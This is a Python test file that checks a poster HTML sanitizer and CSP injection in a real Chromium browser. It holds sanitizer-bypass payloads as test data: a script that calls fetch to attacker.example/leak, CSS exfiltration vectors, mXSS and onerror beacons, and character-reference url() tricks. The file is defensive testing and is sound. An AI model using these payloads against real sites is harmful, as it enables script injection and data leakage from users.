"""Browser-level poster sandbox security evidence."""

from __future__ import annotations

import base64
import http.server
import threading
from contextlib import contextmanager
from html import escape

import pytest

from app.DeepAgent.poster.sanitizer import (
    inject_poster_csp,
    sanitize_css,
    sanitize_poster_markup,
)
from tests.test_poster_export_contract import (
    _CountingHandler,
    _one_pixel_png,
)


def _launch_chromium_or_skip(playwright):
    from playwright.sync_api import Error as PlaywrightError

    try:
        return playwright.chromium.launch(headless=True)
    except PlaywrightError as exc:
        message = str(exc)
        if (
            "Executable doesn't exist" in message
            or "playwright install" in message
            or "Looks like Playwright was just installed" in message
        ):
            pytest.skip("Playwright Chromium executable is not installed")
        raise


@pytest.fixture(scope="module")
def chromium_browser():
    sync_api = pytest.importorskip("playwright.sync_api")
    with sync_api.sync_playwright() as playwright:
        browser = _launch_chromium_or_skip(playwright)
        try:
            yield browser
        finally:
            browser.close()


@pytest.fixture
def counting_server():
    """Keep request state local to this case, never the export-test handler."""

    class CountingHandler(_CountingHandler):
        hits: list[str] = []
        received = threading.Condition()

        def do_GET(self) -> None:  # noqa: N802 - stdlib handler name
            with self.received:
                try:
                    super().do_GET()
                finally:
                    self.received.notify_all()

    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), CountingHandler)
    thread = threading.Thread(
        target=server.serve_forever, kwargs={"poll_interval": 0.01}, daemon=True
    )
    thread.start()
    try:
        yield server
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def test_sanitized_poster_is_inert_inside_empty_sandboxed_iframe(
    chromium_browser,
) -> None:
    sanitized = sanitize_poster_markup(
        """
        <article>
          <h1 id="safe-poster-text">Safe Static Poster</h1>
          <svg id="safe-poster-svg" viewBox="0 0 100 50">
            <rect width="100" height="50" fill="#2563eb"></rect>
            <text x="10" y="25">Safe SVG</text>
          </svg>
          <script>
            parent.document.body.dataset.posterPwned = "script";
            parent.window.__posterSideEffect = "script";
            parent.localStorage.setItem("posterPwned", "script");
            window.open("https://attacker.example/popup");
            top.location = "https://attacker.example/top";
            fetch("https://attacker.example/leak");
          </script>
          <img src="https://attacker.example/pixel.png" alt="tracker">
          <iframe src="data:text/html,<script>parent.__posterSideEffect='iframe'</script>"></iframe>
          <a href="data:text/html,<script>opener.__posterSideEffect='popup'</script>">bad</a>
          <div onclick="parent.__posterSideEffect='event'">click me</div>
          <body background="https://attacker.example/body-bg.png"></body>
          <table background="//attacker.example/table-bg.png">
            <tr><td background="../attacker-relative-bg.png">cell</td></tr>
          </table>
          <style>
            body { background: url(https://attacker.example/bg.png); }
          </style>
          <style/>
          @import url(https://attacker.example/selfclosed-import.css);
          #safe-poster-text { background: url(https://attacker.example/selfclosed-bg.png); }
          <!-- *{ background: url(https://attacker.example/selfclosed-comment.png) } -->
          <style>.concealer{}</style>
        </article>
        """
    )

    outer_page = f"""
    <!doctype html>
    <html>
      <body data-parent-safe="1">
        <div id="parent-sentinel">Parent Safe</div>
        <script>
          window.__posterSideEffect = "";
          try {{ localStorage.removeItem("posterPwned"); }} catch (err) {{}}
        </script>
        <iframe id="poster-frame" sandbox="" srcdoc="{escape(sanitized, quote=True)}"></iframe>
      </body>
    </html>
    """

    with chromium_browser.new_context() as context:
        observed_urls: list[str] = []
        dialogs: list[str] = []
        popups: list[str] = []
        navigations: list[str] = []

        context.on("request", lambda request: observed_urls.append(request.url))
        context.route(
            "**/*",
            lambda route: (
                route.abort()
                if "attacker.example" in route.request.url
                or route.request.url.startswith("data:text/html")
                else route.continue_()
            ),
        )

        page = context.new_page()
        page.on(
            "dialog", lambda dialog: (dialogs.append(dialog.message), dialog.dismiss())
        )
        page.on("popup", lambda popup: popups.append(popup.url))
        page.on("framenavigated", lambda frame: navigations.append(frame.url))

        page.set_content(outer_page, wait_until="load")
        page.wait_for_timeout(250)

        frame = page.frame_locator("#poster-frame")
        assert frame.locator("#safe-poster-text").is_visible()
        assert frame.locator("#safe-poster-svg").is_visible()

        parent_state = page.evaluate(
            """
            () => {
              let storageValue = null;
              try { storageValue = localStorage.getItem("posterPwned"); } catch (err) {}
              return {
                topUrl: window.location.href,
                parentDataset: document.body.dataset.posterPwned || "",
                sideEffect: window.__posterSideEffect || "",
                storageValue,
                parentText: document.querySelector("#parent-sentinel")?.textContent || ""
              };
            }
            """
        )

        assert dialogs == []
        assert popups == []
        assert parent_state["topUrl"] == "about:blank"
        assert parent_state["parentDataset"] == ""
        assert parent_state["sideEffect"] == ""
        assert parent_state["storageValue"] in (None, "")
        assert parent_state["parentText"] == "Parent Safe"
        assert not any("attacker.example" in url for url in observed_urls)
        assert not any(url.startswith("data:text/html") for url in observed_urls)
        assert not any("attacker.example" in url for url in navigations)
        assert not any(url.startswith("data:text/html") for url in navigations)


# --- Document CSP -----------------------------------------------------------
#
# sandbox="" stops scripts but not CSS fetches, which is how the <style/> hole
# reached the network. The policy the delivered document carries is a layer
# below the sanitizer, so it is measured against payloads that are already past
# it.
#
# The oracle is where the *browser* puts the meta, never whether the string is
# in the output. A meta that lands in <header>, or inside a comment, is present
# in the bytes and ignored by the browser -- with no console warning at all in
# the comment case.

_EGRESS_PAYLOAD = """
<style>
 @import url({base}/import.css);
 #bg1 {{ background-image:url({base}/bg1.png); width:9px; height:9px }}
 #bg2 {{ background:url({base}/bg2.png); width:9px; height:9px }}
 #ls {{ list-style-image:url({base}/li.png) }}
 #bd {{ border-image:url({base}/border.png) 30; width:9px; height:9px }}
 #cur {{ cursor:url({base}/cur.cur),auto }}
 #mask {{ mask-image:url({base}/mask.svg); width:9px; height:9px }}
 @font-face {{ font-family:pwn; src:url({base}/font.woff2) }}
 #ft {{ font-family:pwn }}
</style>
<link rel="stylesheet" href="{base}/sheet.css">
<link rel="prefetch" href="{base}/prefetch">
<link rel="preload" as="image" href="{base}/preload.png">
<img src="{base}/pixel.png" alt="tracker">
<img srcset="{base}/srcset.png 1x" alt="tracker">
<ul id="ls"><li>x</li></ul>
<div id="bg1"></div><div id="bg2"></div><div id="bd"></div>
<div id="cur">c</div><div id="mask"></div><span id="ft">f</span>
"""

_CSP_PLACEMENT = """() => {
  const doc = document.querySelector('#poster-frame').contentDocument;
  const meta = doc.querySelector('meta[http-equiv="Content-Security-Policy" i]');
  return {
    found: !!meta,
    inHead: meta ? meta.parentElement === doc.head : false,
    parent: meta ? meta.parentElement.tagName : null,
  };
}"""

_BODY = "<h1>Poster</h1>"
# poster_agent.py:1024 가 조각을 감싸는 형태 그대로. <head>가 없고 <header>로
# 시작한다 -- 프롬프트 템플릿(poster_agent.py:1416)이 그 구조를 지시하므로
# 공격자 없이도 매번 나오는 모양이고, 정규식 앵커가 무너지던 실제 경로다.
_POSTER_SHAPES = {
    "head-present": (
        f"<!DOCTYPE html><html><head><title>t</title></head><body>{_BODY}</body></html>"
    ),
    "poster-agent-wrap": (
        f"<!DOCTYPE html>\n<html lang='ko'>\n<header>Title</header>{_BODY}\n</html>"
    ),
    "head-inside-a-comment": (
        "<!DOCTYPE html><!--<head>--><html><head><title>t</title></head>"
        f"<body>{_BODY}</body></html>"
    ),
    "bare-fragment": f"<header>Title</header>{_BODY}",
    "late-head": (
        f"<!DOCTYPE html><html><header>Title</header>{_BODY}"
        "<head><title>t</title></head></html>"
    ),
    # <html>이 body 콘텐츠 뒤에 온다. 그 <html> 뒤에 심으면 meta는 body에 남고
    # 정책이 무시된다 (실측 egress 5/5). 문서 맨 앞에 심어야 head로 올라간다.
    "late-html": f"<header>Title</header><html><body>{_BODY}</body></html>",
    # BOM은 <header>와 <body> 두 형태로 모두 건다. 브라우저가 head를 끌어올리는
    # 정도가 형태마다 달라, 한쪽만 두면 앵커 버그를 비켜 간다.
    "bom-first-header": (f"﻿<!DOCTYPE html><html><header>Title</header>{_BODY}</html>"),
    "bom-first-body": f"﻿<!DOCTYPE html><html><body>{_BODY}</body></html>",
}


def _past_the_sanitizer(document: str, payload: str) -> str:
    """Put the payload where the next sanitizer hole would leave it."""
    if "</html>" in document:
        return document.replace("</html>", f"{payload}</html>")
    return document + payload


@contextmanager
def _poster_browser(browser, counting_server=None):
    """A fresh context and listeners for every document, on shared Chromium."""
    context = browser.new_context()
    try:
        page = context.new_page()
        messages: list[str] = []
        page.on("console", lambda message: messages.append(message.text))

        def load(
            document: str,
            *,
            sandbox: str = "",
            expected_hits: int = 0,
            observe_egress: bool = True,
        ) -> dict:
            handler = counting_server.RequestHandlerClass if counting_server else None
            if handler:
                with handler.received:
                    handler.hits = []
            page.set_content(
                "<!doctype html><html><body>"
                f'<iframe id="poster-frame" sandbox="{sandbox}"'
                f' srcdoc="{escape(document, quote=True)}"'
                ' style="width:900px;height:700px"></iframe>'
                "</body></html>",
                wait_until="load",
            )
            if expected_hits:
                assert handler is not None
                with handler.received:
                    assert handler.received.wait_for(
                        lambda: len(set(handler.hits)) >= expected_hits, timeout=5
                    ), f"Expected {expected_hits} requests, got {handler.hits}"
            elif observe_egress:
                # Absence needs a full observation window, not a readiness wait.
                page.wait_for_timeout(500)
            hits = []
            if handler:
                with handler.received:
                    hits = sorted(set(handler.hits))
            return {
                "hits": hits,
                "violations": [m for m in messages if "Content Security Policy" in m],
            }

        yield page, load
    finally:
        context.close()


@pytest.mark.parametrize("shape", sorted(_POSTER_SHAPES), ids=sorted(_POSTER_SHAPES))
def test_the_poster_csp_reaches_document_head_and_stops_egress(
    chromium_browser,
    counting_server,
    shape,
) -> None:
    """Every poster shape this pipeline can produce, measured in a browser.

    **Egress is the verdict.** The control run pins the same document without a
    policy, so a zero is evidence of blocking rather than of a payload that
    never fired.

    Placement is the secondary signal, and it is read from the DOM rather than
    from the string because the ways this broke -- anchoring on <header>,
    anchoring inside a comment, trusting the implied head of a fragment -- all
    leave the meta in the output bytes while enforcing nothing. Treat it as
    corroboration: the tree builder relocates elements, so a policy can be
    enforced from a node that no longer reports document.head as its parent.
    Where the two disagree, egress decides.
    """
    base = f"http://127.0.0.1:{counting_server.server_address[1]}"
    payload = _EGRESS_PAYLOAD.format(base=base)
    sanitized = sanitize_poster_markup(_POSTER_SHAPES[shape])
    delivered = inject_poster_csp(sanitized)

    with _poster_browser(chromium_browser, counting_server) as (page, load):
        # contentDocument를 읽으려면 same-origin이 필요하다. 배달 바이트는
        # 아래 두 번의 sandbox="" 로드와 같다.
        load(delivered, sandbox="allow-same-origin", observe_egress=False)
        page.frame_locator("#poster-frame").locator("h1").wait_for(state="visible")
        placement = page.evaluate(_CSP_PLACEMENT)
    with _poster_browser(chromium_browser, counting_server) as (_page, load):
        control = load(_past_the_sanitizer(sanitized, payload), expected_hits=13)
    with _poster_browser(chromium_browser, counting_server) as (_page, load):
        protected = load(_past_the_sanitizer(delivered, payload))

    assert placement == {"found": True, "inHead": True, "parent": "HEAD"}
    assert len(control["hits"]) >= 13, control["hits"]
    assert protected["hits"] == []
    # 위반이 조용히 삼켜지면 다음 구멍도 조용히 열린다.
    assert protected["violations"]


# --- Parser parity (mXSS) ---------------------------------------------------
#
# The sanitizer parses with html.parser; the browser parses with an HTML5 tree
# builder. Where the two disagree, markup the sanitizer copied through as inert
# text becomes live in the browser. A string assertion cannot settle this: it
# can see that "</style>" is in the output without knowing whether the browser
# ends the element there. So each vector is loaded twice with scripts ENABLED,
# and the verdict is whether the payload's beacon actually reaches the network.
#
# The beacon nests quotes deliberately: CSS string with ', HTML attribute with
# ", JS with backticks, so no layer terminates another and a silent run means
# the sanitizer stopped it rather than the payload breaking itself.

# The two classes need different controls, so they are two tests.
#
# PASSTHROUGH: live markup the sanitizer copied through as inert text. The
# control is the raw input -- it fires on its own, and must not after sanitizing.
_PASSTHROUGH_VECTORS = {
    # <style> inside SVG is foreign content, where HTML5 does NOT switch to
    # RAWTEXT -- html.parser does, and hides the <img> from the sanitizer.
    "svg-style-is-not-rawtext-in-the-browser": (
        '<svg><style><img src=x onerror="{js}"></style></svg>'
    ),
    "svg-style-nested-deeper": (
        '<svg><g><svg><style><img src=x onerror="{js}"></style></svg></g></svg>'
    ),
    "svg-style-closing-its-own-svg": (
        '<svg><style></svg><img src=x onerror="{js}"></style></svg>'
    ),
    # html.parser runs the comment to the last "-->"; HTML5 ends "<!-->" at once.
    "abrupt-comment-the-browser-ends-early": '<!-->x<img src=x onerror="{js}">-->',
    "abrupt-comment-with-a-dash": '<!--->x<img src=x onerror="{js}">-->',
    "abrupt-comment-closed-with-a-bang": '<!-->-<img src=x onerror="{js}">--!>',
}

# SANITIZER-BUILT: the raw input is inert in a browser -- the escape stays inside
# a CSS string and never becomes markup. It is sanitize_css *decoding* it that
# spells out a real </style>. So the raw input is the wrong control: it proves
# nothing by staying silent. The control is the same stylesheet emitted the way
# it was before the fix -- sanitize_css's output with no re-escaping -- which
# isolates the escape as the one thing standing between it and execution.
_STYLE_BUILT_VECTORS = {
    "css-escape-spelling-a-style-close": (
        "<style>",
        "</style>",
        "a{{content:'\\3c /style>\\3cimg src=x onerror=\"{js}\">'}}",
    ),
    "css-escape-in-a-selector": (
        "<style>",
        "</style>",
        "a[href='\\3c/style>\\3cimg src=x onerror=\"{js}\">']{{color:red}}",
    ),
    "css-escape-inside-a-css-comment": (
        "<style>",
        "</style>",
        '/* \\3c/style>\\3cimg src=x onerror="{js}"> */a{{color:red}}',
    ),
    "css-escape-inside-svg-style": (
        "<svg><style>",
        "</style></svg>",
        "a{{content:'\\3c/style>\\3cimg src=x onerror=\"{js}\">'}}",
    ),
}


@pytest.mark.parametrize(
    "vector", sorted(_PASSTHROUGH_VECTORS), ids=sorted(_PASSTHROUGH_VECTORS)
)
def test_markup_the_sanitizer_read_as_text_is_inert_in_a_browser(
    chromium_browser,
    counting_server,
    vector,
) -> None:
    """Scripts on, network watched: the beacon is the verdict.

    The control run pins the same vector unsanitized, so a zero is evidence that
    the sanitizer stopped it and not that the payload never fired.
    """
    base = f"http://127.0.0.1:{counting_server.server_address[1]}"
    payload = _PASSTHROUGH_VECTORS[vector].format(
        js=f"new Image().src=`{base}/{vector}`"
    )

    with _poster_browser(chromium_browser, counting_server) as (_page, load):
        control = load(payload, sandbox="allow-scripts", expected_hits=1)
    with _poster_browser(chromium_browser, counting_server) as (_page, load):
        protected = load(sanitize_poster_markup(payload), sandbox="allow-scripts")

    assert control["hits"], f"{vector} never fired unsanitized, so it proves nothing"
    assert protected["hits"] == []


@pytest.mark.parametrize(
    "vector", sorted(_STYLE_BUILT_VECTORS), ids=sorted(_STYLE_BUILT_VECTORS)
)
def test_a_decoded_css_escape_cannot_become_markup_in_a_browser(
    chromium_browser,
    counting_server,
    vector,
) -> None:
    """The sanitizer must not be the thing that assembles the payload.

    Decoding escapes is deliberate -- it is what stops an obfuscated ``u\\72 l(``
    from reviving downstream -- so the control here is the decode *without* the
    re-escaping that pairs with it. That control firing is what makes the
    protected run mean something.
    """
    open_tag, close_tag, css = _STYLE_BUILT_VECTORS[vector]
    css = css.format(
        js=f"new Image().src=`http://127.0.0.1:"
        f"{counting_server.server_address[1]}/{vector}`"
    )

    with _poster_browser(chromium_browser, counting_server) as (_page, load):
        control = load(
            f"{open_tag}{sanitize_css(css)}{close_tag}",
            sandbox="allow-scripts",
            expected_hits=1,
        )
    with _poster_browser(chromium_browser, counting_server) as (_page, load):
        protected = load(
            sanitize_poster_markup(f"{open_tag}{css}{close_tag}"),
            sandbox="allow-scripts",
        )

    assert control["hits"], f"{vector} did not break out even unescaped"
    assert protected["hits"] == []


# A <style> inside <svg> is foreign content, so its text goes through the data
# state and HTML character references are decoded there. sanitize_css decodes
# CSS escapes only, so "&#x75;rl(" reads inert to it and "url(" to the browser.
#
# These are measured WITHOUT inject_poster_csp on purpose: routers/autofigure.py
# returns sanitized svg_content straight to its caller with no policy wrapped
# around it, so the sanitizer is the only thing standing there.
_CHARREF_VECTORS = {
    "hex": "&#x75;rl",
    "hex-uppercase-x": "&#X75;rl",
    "decimal": "&#117;rl",
    "zero-padded": "&#x000075;rl",
    "no-semicolon": "&#x75rl",
    "split-across-the-token": "u&#x72;l",
    "entity-spelled-paren": "url&#x28;",
}


@pytest.mark.parametrize(
    "vector", sorted(_CHARREF_VECTORS), ids=sorted(_CHARREF_VECTORS)
)
def test_a_character_reference_cannot_refetch_from_inside_an_svg_style(
    chromium_browser,
    counting_server,
    vector,
) -> None:
    """Egress is the verdict, and the control run is the same CSS unsanitized."""
    base = f"http://127.0.0.1:{counting_server.server_address[1]}"
    spelling = _CHARREF_VECTORS[vector]
    paren = "" if spelling.endswith(";") and "(" not in spelling else "("
    payload = (
        f"<svg><style>*{{background:{spelling}{paren}{base}/{vector});"
        "width:9px;height:9px}</style></svg><div>x</div>"
    )

    with _poster_browser(chromium_browser, counting_server) as (_page, load):
        control = load(payload, expected_hits=1)
    with _poster_browser(chromium_browser, counting_server) as (_page, load):
        protected = load(sanitize_poster_markup(payload))

    assert control["hits"], f"{vector} never fetched unsanitized, so it proves nothing"
    assert protected["hits"] == []


def test_an_svg_style_keeps_the_css_a_poster_is_actually_drawn_with(
    chromium_browser,
) -> None:
    """The entity escape must not cost a real SVG stylesheet its rules."""
    sanitized = sanitize_poster_markup(
        "<svg viewBox='0 0 40 40'><style>"
        "#box{fill:rgb(0,128,0)}"
        "@media (1px < width < 99999px){#box{fill:rgb(0,0,255)}}"
        "</style><rect id='box' width='40' height='40'/></svg>"
    )

    with _poster_browser(chromium_browser) as (page, load):
        load(sanitized, sandbox="allow-same-origin", observe_egress=False)
        page.frame_locator("#poster-frame").locator("#box").wait_for(state="visible")
        fill = page.evaluate(
            """() => {
                 const d = document.querySelector('#poster-frame').contentDocument;
                 return getComputedStyle(d.getElementById('box')).fill;
               }"""
        )

    # the media query wins, which only happens if "<" kept its delimiter meaning
    assert fill == "rgb(0, 0, 255)"


def test_a_poster_under_the_csp_still_shows_its_inline_css_and_data_figure(
    chromium_browser,
) -> None:
    """The policy exists to block egress, not to break the poster: inline CSS
    and base64 figures are what every measured poster is made of.
    """
    encoded = base64.b64encode(_one_pixel_png()).decode("ascii")
    delivered = inject_poster_csp(
        sanitize_poster_markup(
            "<!DOCTYPE html><html><head>"
            "<style>#card{background:rgb(0,128,0);width:120px;height:60px}</style>"
            f'</head><body><div id="card"></div><img id="figure" '
            f'src="data:image/png;base64,{encoded}" '
            'style="width:40px;height:40px" alt="figure"></body></html>'
        )
    )

    with _poster_browser(chromium_browser) as (page, load):
        # Keep the negative console-violation observation window as well.
        report = load(delivered)
        frame = page.frame_locator("#poster-frame")
        assert frame.locator("#figure").is_visible()
        rendered = frame.locator("#figure").evaluate(
            "el => ({"
            "  figureWidth: el.naturalWidth,"
            "  cardBackground: getComputedStyle("
            "    el.ownerDocument.getElementById('card')).backgroundColor"
            "})"
        )

    assert rendered["figureWidth"] == 1
    assert rendered["cardBackground"] == "rgb(0, 128, 0)"
    assert report["violations"] == []
